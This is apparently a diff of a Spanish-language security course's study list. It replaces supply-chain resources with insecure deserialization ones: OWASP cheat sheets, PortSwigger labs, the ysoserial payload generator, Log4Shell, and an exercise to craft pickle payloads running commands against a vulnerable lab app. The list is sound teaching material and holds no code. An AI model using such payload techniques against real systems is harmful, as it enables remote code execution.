-2. **Practicar:** Crear cuenta en Snyk (snyk.io) y analizar un proyecto real
-3. **Leer:** OWASP Logging Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
-4. **Practicar:** Configurar Dependabot en un repositorio GitHub
-5. **Leer:** SBOM Guide - CISA: https://www.cisa.gov/sbom
-6. **Experimentar:** Generar SBOM para el proyecto actual usando el codigo del ejercicio 3
-7. **Profundizar:** Investigar el formato CycloneDX vs SPDX para SBOM
-8. **Leer:** OWASP Top 10:2021 - A06:2021 Vulnerable and Outdated Components
+1. **Leer:** OWASP Deserialization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+2. **Leer:** OWASP Java Deserialization - https://owasp.org/www-project-cheat-sheets/cheatsheets/Deserialization_Cheat_Sheet.html
+3. **Practicar:** PortSwigger Deserialization Labs - https://portswigger.net/web-security/deserialization
+4. **Experimentar:** Generar payloads pickle con diferentes comandos y probar contra la app vulnerable
+5. **Leer:** ysoserial - Herramienta para generar payloads de deserializacion Java: https://github.com/frohoff/ysoserial
+6. **Profundizar:** Investigar el ataque Log4Shell en detalle y sus mitigaciones
+7. **Leer:** Python pickle documentation - warnings about security: https://docs.python.org/3/library/pickle.html
+
 
 
